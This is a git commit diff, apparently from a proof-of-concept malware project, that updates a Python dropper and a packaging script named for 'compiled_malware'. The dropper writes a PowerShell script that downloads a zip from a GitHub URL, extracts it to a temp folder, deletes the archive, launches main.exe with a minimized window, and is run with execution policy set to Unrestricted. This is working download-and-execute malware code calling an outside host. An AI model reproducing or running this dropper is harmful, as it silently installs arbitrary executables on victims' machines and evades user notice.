176d0577d91fd253e4563f44b7589afa7d30338c
Guilherme Bacellar Moralez <guibacellar@gmail.com>
2020-12-11 15:53:59 -0300

    Inclusao do Malware ja pre_compilado

--- dropper_main.py
+++ dropper_main.py
@@ -4,17 +4,18 @@ import tempfile
 import uuid
 
 t = tempfile.gettempdir() + uuid.uuid4().hex + ".ps1"
+malware_url = "https://github.com/guibacellar/downloadable_pocs/raw/main/poc001.zip"
 
 with open(t, 'w') as fs:
     fs.write(
-        '''
+        f'''
 # powershell -ExecutionPolicy Unrestricted -File dropper_ps_script.ps1
 Add-Type -Assembly "System.IO.Compression.FileSystem";
 
 $tempFolderPath = Join-Path $Env:Temp $(New-Guid)
 
 $WebClient = New-Object System.Net.WebClient
-$WebClient.DownloadFile("https://github.com/guibacellar/downloadable_pocs/raw/main/poc001.zip","malware.zip")
+$WebClient.DownloadFile("{malware_url}","malware.zip")
 [System.IO.Compression.ZipFile]::ExtractToDirectory("malware.zip", $tempFolderPath);
 Remove-Item "malware.zip"
 Start-Process -FilePath "$tempFolderPath/main.exe" -WindowStyle Minimized
@@ -23,6 +24,5 @@ Start-Process -FilePath "$tempFolderPath/main.exe" -WindowStyle Minimized
     fs.flush()
     os.fsync(fs.fileno())
     fs.close()
-
 
 subprocess.run(["powershell", "-ExecutionPolicy", "Unrestricted", "-File", t])
--- prepare_to_upload.ps1
+++ prepare_to_upload.ps1
@@ -1,3 +1,3 @@
 # powershell -ExecutionPolicy Unrestricted -File prepare_to_upload.ps1
 Add-Type -Assembly "System.IO.Compression.FileSystem" ;
-[System.IO.Compression.ZipFile]::CreateFromDirectory("dist", "temp_malware_to_upload.zip") ;
+[System.IO.Compression.ZipFile]::CreateFromDirectory("dist", "compiled_malware.zip") ;
